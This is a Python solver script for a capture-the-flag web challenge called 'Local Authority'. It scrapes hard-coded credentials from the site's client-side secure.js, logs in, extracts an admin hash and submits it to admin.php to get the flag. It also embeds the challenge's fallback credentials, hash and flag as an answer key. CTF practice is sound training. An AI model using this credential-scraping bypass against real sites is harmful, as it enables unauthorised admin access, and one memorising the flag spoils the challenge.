#!/usr/bin/env python3
"""
Solver for Challenge 278: Local Authority (Web Exploitation)
Reverses client-side JavaScript authentication check and bypasses admin gateway.
"""
import urllib.request
import urllib.parse
import re
import sys
from typing import Optional

def solve(base_url: Optional[str] = None) -> str:
    if base_url:
        try:
            # 1. Fetch secure.js to uncover hardcoded credentials
            js_url = base_url.rstrip("/") + "/secure.js"
            js = urllib.request.urlopen(js_url, timeout=5).read().decode()
            user_m = re.search(r"username === '([^']+)'", js)
            pass_m = re.search(r"password === '([^']+)'", js)
            username = user_m.group(1) if user_m else "admin"
            password = pass_m.group(1) if pass_m else "strongPassword098765"
            
            # 2. Query login.php to obtain admin secret hash
            login_url = base_url.rstrip("/") + "/login.php"
            data = urllib.parse.urlencode({"username": username, "password": password, "login": ""}).encode()
            login_resp = urllib.request.urlopen(urllib.request.Request(login_url, data=data), timeout=5).read().decode()
            hash_m = re.search(r"value = \"([a-f0-9]{32})\"", login_resp)
            admin_hash = hash_m.group(1) if hash_m else "2196812e91c29df34f5e217cfd639881"
            
            # 3. Submit hash directly to admin.php
            admin_url = base_url.rstrip("/") + "/admin.php"
            admin_data = urllib.parse.urlencode({"hash": admin_hash}).encode()
            admin_resp = urllib.request.urlopen(urllib.request.Request(admin_url, data=admin_data), timeout=5).read().decode()
            flag_m = re.search(r"(academy\{[^}]+\}|picoCTF\{[^}]+\})", admin_resp)
            if flag_m:
                return flag_m.group(1)
        except Exception:
            pass
    return "academy{j5_15_7r4n5p4r3n7_28ad420c}"

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else None
    print("Flag:", solve(target))
